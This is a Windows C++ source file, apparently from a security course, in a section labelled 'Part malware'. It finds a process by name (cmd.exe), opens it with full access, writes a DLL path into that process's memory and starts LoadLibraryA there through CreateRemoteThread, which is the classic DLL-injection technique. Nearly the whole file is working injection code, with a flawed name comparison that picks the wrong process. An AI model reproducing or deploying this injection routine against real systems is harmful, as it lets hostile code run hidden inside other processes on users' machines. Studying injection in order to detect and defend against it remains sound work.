#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

// to get the pid of an exe by his name
DWORD GetPidByName(const char *name){
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	char buf[MAX_PATH] = { 0 };
	size_t charsConverted = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(snapshot, &entry)) {
        while(Process32Next(snapshot, &entry)) {
			wcstombs_s(&charsConverted, buf, entry.szExeFile, MAX_PATH);  
			if(_stricmp(buf, name)){
				HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(entry.th32ProcessID));
				if(ph != NULL){
					printf("process on: %d\n", entry.th32ProcessID);
					CloseHandle(snapshot);
					return entry.th32ProcessID;
				}else{
					printf("could not obtain handle on %d", entry.th32ProcessID);
				}
			}
        }
    }

    CloseHandle(snapshot);
    return 0;  // Process ID not found
}



int _tmain(int argc, _TCHAR* argv[])
{
	/******************Part malware************************/
	HMODULE dllHandle;
	// Load the DLL to get it's base address
    if( (dllHandle = LoadLibrary(L"User32.dll")) == NULL ) {
        printf("[!] Error: loading the DLL, 0x%.8x\n", (unsigned int) GetLastError());
	}else{
		printf("[*] Base address : 0x%.8x\n", (unsigned int) dllHandle);
	}
	// To get the authority to cmd
	DWORD pid = GetPidByName("cmd.exe");
	HANDLE cmd = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	//from course
	char* dll = "C:\\documents and settings\\administrateur\\mes documents\\visual studio 2010\\Projects\\injection\\Release\\injection.dll";
	char* dll_dans_notepad = (char*) VirtualAllocEx(cmd, NULL, strlen(dll)+1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	DWORD ecrites;
	WriteProcessMemory(cmd, dll_dans_notepad, dll, strlen(dll)+1, &ecrites);
	void* load_library = LoadLibraryA;
	CreateRemoteThread(cmd, NULL, 0, (LPTHREAD_START_ROUTINE) load_library, dll_dans_notepad, 0, NULL);
	// WaitForSingleObject (...)
	while(1);

	/*
	// Read the memory
	MEMORY_BASIC_INFORMATION mbi;
	VirtualQuery( (void *) dllHandle, &mbi, sizeof(mbi));
	printf("Addresse: %p %lx\n",mbi.BaseAddress, mbi.Protect);
	
	int addr = (int )dllHandle;
	int *p = &addr;
	printf("%d\n", *p);
	while(1);*/



	/******************End************************/
	
	return 0;
}
